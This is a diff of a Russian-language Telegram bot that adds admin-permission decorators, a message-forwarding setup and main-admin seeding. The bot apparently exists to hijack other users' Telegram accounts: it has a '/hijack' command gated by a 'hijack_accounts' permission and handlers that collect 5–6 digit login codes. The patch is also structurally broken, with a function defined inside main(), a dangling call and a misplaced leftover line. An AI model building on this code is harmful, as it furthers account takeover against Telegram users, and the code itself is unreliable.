@@ -83,7 +83,8 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.enums import ChatType
 from aiogram.types import Message, ChatMemberUpdated, ChatJoinRequest
-
+from functools import wraps
+from aiogram.types import Message, CallbackQuery
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
@@ -904,7 +905,12 @@ async def handle_private_message(message: Message):
     """Обрабатывает все сообщения от пользователей в личных диалогах"""
     user_id = message.from_user.id
     
-    # Проверяем, настроена ли пересылка для этого пользователя
+    # ПРОВЕРКА: Если сообщение - команда, пропускаем пересылку
+    if message.text and message.text.startswith('/'):
+        # Команды обрабатываются отдельно
+        return
+    
+    # 1. Проверяем, настроена ли пересылка через MessageForwarder
     channel_id = message_forwarder.get_user_channel(user_id)
     
     if channel_id:
@@ -912,7 +918,7 @@ async def handle_private_message(message: Message):
         result = await message_forwarder.forward_user_message(user_id, message)
         
         if result['success']:
-            # Отправляем подтверждение пользователю (опционально)
+            # Опционально: отправляем подтверждение пользователю
             try:
                 await message.reply(
                     f"✅ <b>Сообщение отправлено в канал</b>\n\n"
@@ -933,6 +939,7 @@ async def handle_private_message(message: Message):
                 )
             except:
                 pass
+        return  # Завершаем обработку, если сообщение переслано
     
     # Далее продолжаем обычную обработку команд бота
     # Если это не команда - игнорируем
@@ -1189,6 +1196,57 @@ class AnonymityManager:
         return cleaned
 
 anonymity_manager = AnonymityManager()
+@dp.message(Command("reload_admins"))
+async def cmd_reload_admins(message: Message):
+    """Перезагружает кэш администраторов (только для главного админа)"""
+    if message.from_user.id != config.MAIN_ADMIN_ID:
+        await message.answer("❌ Недостаточно прав.")
+        return
+    
+    try:
+        admin_manager.load_admins_cache()
+        count = len(admin_manager.admin_cache)
+        await message.answer(f"✅ Кэш админов перезагружен. Загружено записей: {count}")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+
+        
+def admin_required(require_main: bool = False, required_permission: str = None):
+    """Декоратор для проверки прав администратора."""
+    def decorator(handler):
+        @wraps(handler)
+        async def wrapper(event, *args, **kwargs):
+            user_id = event.from_user.id
+            
+            # 1. Проверка на администратора
+            if not admin_manager.is_admin(user_id):
+                if isinstance(event, Message):
+                    await event.answer("❌ У вас нет доступа к этой команде.")
+                elif isinstance(event, CallbackQuery):
+                    await event.answer("❌ Доступ запрещен.", show_alert=True)
+                return
+            
+            # 2. Проверка на главного админа (если требуется)
+            if require_main and not admin_manager.is_main_admin(user_id):
+                if isinstance(event, Message):
+                    await event.answer("❌ Только главный администратор может использовать эту команду.")
+                elif isinstance(event, CallbackQuery):
+                    await event.answer("❌ Только главный админ.", show_alert=True)
+                return
+            
+            # 3. Проверка конкретного разрешения (если указано)
+            if required_permission and not admin_manager.has_permission(user_id, required_permission):
+                if isinstance(event, Message):
+                    await event.answer(f"❌ Недостаточно прав. Требуется: {required_permission}")
+                elif isinstance(event, CallbackQuery):
+                    await event.answer(f"❌ Недостаточно прав.", show_alert=True)
+                return
+            
+            # Все проверки пройдены - выполняем обработчик
+            return await handler(event, *args, **kwargs)
+        return wrapper
+    return decorator
 
 # ========== МЕНЕДЖЕР АККАУНТОВ TELEGRAM ==========
 class TelegramAccountManager:
@@ -3924,10 +3982,22 @@ async def cmd_resend_code(message: types.Message, state: FSMContext):
 
 # Команда /admin - быстрый доступ к админке
 @dp.message(Command("admin"))
+@admin_required()
 async def cmd_admin(message: Message):
-    if not admin_manager.is_admin(message.from_user.id):
-        await message.answer("❌ У вас нет доступа к панели администратора.")
-        return
+    # Код обработчика без проверок внутри
+    await message.answer("Добро пожаловать в админ-панель.")
+
+# Для главного админа:
+@dp.message(Command("add_admin"))
+@admin_required(require_main=True)
+async def cmd_add_admin(message: Message):
+    await message.answer("Добавление нового администратора...")
+
+# Для конкретного разрешения:
+@dp.message(Command("hijack"))
+@admin_required(required_permission='hijack_accounts')
+async def cmd_hijack(message: Message):
+    await message.answer("Запуск захвата аккаунта...")
     
     await cmd_start(message, None)
 
@@ -4658,6 +4728,103 @@ async def process_hijack_method(callback_query: CallbackQuery, state: FSMContext
         f"<i>Код состоит из 5-6 цифр.</i>",
         parse_mode="HTML"
     )
+@dp.callback_query(F.data == "setup_forward_menu")
+@admin_required()
+async def setup_forward_menu(callback_query: CallbackQuery):
+    """Меню настройки пересылки сообщений"""
+    user_id = callback_query.from_user.id
+    
+    # Получаем текущий статус пересылки
+    current_channel = message_forwarder.get_user_channel(user_id)
+    
+    if current_channel:
+        # Получаем информацию о канале
+        channel_data = db.fetch_one(
+            "SELECT channel_title FROM channels WHERE channel_id = ?",
+            (current_channel,)
+        )
+        channel_title = channel_data[0] if channel_data else current_channel
+        
+        status_text = f"""
+🔄 <b>ТЕКУЩИЙ СТАТУС ПЕРЕСЫЛКИ</b>
+
+✅ Пересылка активна
+📢 Канал: {channel_title}
+🔗 ID: {current_channel}
+
+<i>Все ваши сообщения в ЛС пересылаются в этот канал.</i>
+"""
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🛑 Остановить пересылку", callback_data="stop_forwarding")],
+            [InlineKeyboardButton(text="✏️ Сменить канал", callback_data="change_forward_channel")],
+            [InlineKeyboardButton(text="📊 Статистика", callback_data="forward_stats")],
+            [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
+        ])
+    else:
+        status_text = """
+🔄 <b>НАСТРОЙКА ПЕРЕСЫЛКИ СООБЩЕНИЙ</b>
+
+Пересылка не настроена.
+Настройте её, чтобы все ваши сообщения в этом боте автоматически пересылались в выбранный канал.
+"""
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="⚙️ Настроить пересылку", callback_data="setup_forward_config")],
+            [InlineKeyboardButton(text="❓ Как это работает", callback_data="forward_help")],
+            [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
+        ])
+    
+    await callback_query.message.edit_text(
+        status_text,
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+    await callback_query.answer()
+
+@dp.callback_query(F.data == "setup_forward_config")
+@admin_required()
+async def setup_forward_config(callback_query: CallbackQuery, state: FSMContext):
+    """Начинает настройку пересылки сообщений"""
+    user_id = callback_query.from_user.id
+    
+    # Получаем список доступных (одобренных) каналов
+    channels = await channel_manager.get_all_channels({'approved_only': True})
+    
+    if not channels:
+        await callback_query.message.edit_text(
+            "❌ <b>НЕТ ДОСТУПНЫХ КАНАЛОВ</b>\n\n"
+            "У вас нет ни одного одобренного канала.\n\n"
+            "Сначала добавьте бота как администратора в канал и дождитесь его одобрения.",
+            parse_mode="HTML"
+        )
+        return
+    
+    # Создаем клавиатуру с выбором канала
+    keyboard_buttons = []
+    
+    for channel in channels:
+        keyboard_buttons.append([
+            InlineKeyboardButton(
+                text=f"📢 {channel['title'][:30]}",
+                callback_data=f"select_forward_channel:{channel['channel_id']}"
+            )
+        ])
+    
+    keyboard_buttons.append([
+        InlineKeyboardButton(text="❌ Отмена", callback_data="setup_forward_menu")
+    ])
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
+    
+    await callback_query.message.edit_text(
+        "🔧 <b>ВЫБЕРИТЕ КАНАЛ ДЛЯ ПЕРЕСЫЛКИ</b>\n\n"
+        "Все ваши сообщения в этом боте будут автоматически пересылаться в выбранный канал.\n\n"
+        "<i>Выберите канал из списка:</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+    await callback_query.answer()
+
+    
 
 @dp.message(AdminStates.waiting_hijack_code)
 async def process_hijack_code(message: Message, state: FSMContext):
@@ -5488,7 +5655,34 @@ class ModerationSystem:
             return None
 
 moderation_system = ModerationSystem()
-
+@dp.callback_query(F.data.startswith("select_forward_channel:"))
+@admin_required()
+async def select_forward_channel(callback_query: CallbackQuery):
+    """Обрабатывает выбор канала для пересылки"""
+    channel_id = callback_query.data.split(":")[1]
+    user_id = callback_query.from_user.id
+    
+    # Настраиваем пересылку
+    success = await message_forwarder.setup_user_channel(user_id, channel_id)
+    
+    if success:
+        await callback_query.message.edit_text(
+            f"✅ <b>ПЕРЕСЫЛКА УСПЕШНО НАСТРОЕНА!</b>\n\n"
+            f"Теперь все ваши сообщения в этом боте будут автоматически пересылаться в выбранный канал.\n\n"
+            f"<i>Отправьте любое сообщение в бота для теста.</i>",
+            parse_mode="HTML"
+        )
+    else:
+        await callback_query.message.edit_text(
+            f"❌ <b>ОШИБКА НАСТРОЙКИ</b>\n\n"
+            f"Не удалось настроить пересылку для канала {channel_id}\n\n"
+            f"<i>Проверьте, что:\n"
+            f"1. Канал одобрен\n"
+            f"2. Бот является администратором\n"
+            f"3. Уведомления в канале включены</i>",
+            parse_mode="HTML"
+        )
+    await callback_query.answer()
 
 class ForwardingSystem:
     """Система пересылки сообщений из ЛС в каналы"""
@@ -6340,6 +6534,40 @@ async def main():
     # Запускаем бота
     logger.info("Бот запущен и готов к работе")
     
+async def ensure_main_admin():
+    """Гарантирует, что главный админ есть в базе и кэше."""
+    try:
+        admin_data = db.fetch_one(
+            "SELECT 1 FROM admins WHERE user_id = ? AND is_active = 1",
+            (config.MAIN_ADMIN_ID,)
+        )
+        if not admin_data:
+            # Создаём запись главного админа
+            token = encryptor.generate_token()
+            db.execute('''
+                INSERT OR REPLACE INTO admins
+                (user_id, username, first_name, is_main_admin, session_token, session_expires, permissions)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                config.MAIN_ADMIN_ID,
+                'main_admin',
+                'Главный Админ',
+                1,
+                token,
+                (datetime.now() + timedelta(days=30)).isoformat(),
+                'all'
+            ))
+            logger.info(f"Создана запись главного админа {config.MAIN_ADMIN_ID}")
+        
+        # Принудительно перезагружаем кэш администраторов
+        admin_manager.load_admins_cache()
+        logger.info(f"Кэш админов перезагружен. Загружено: {len(admin_manager.admin_cache)}")
+        
+    except Exception as e:
+        logger.error(f"Ошибка инициализации главного админа: {e}")
+
+# Вызов функции перед запуском поллинга
+    await ensure_main_admin()
     try:
         await dp.start_polling(bot, skip_updates=True)
     except KeyboardInterrupt:
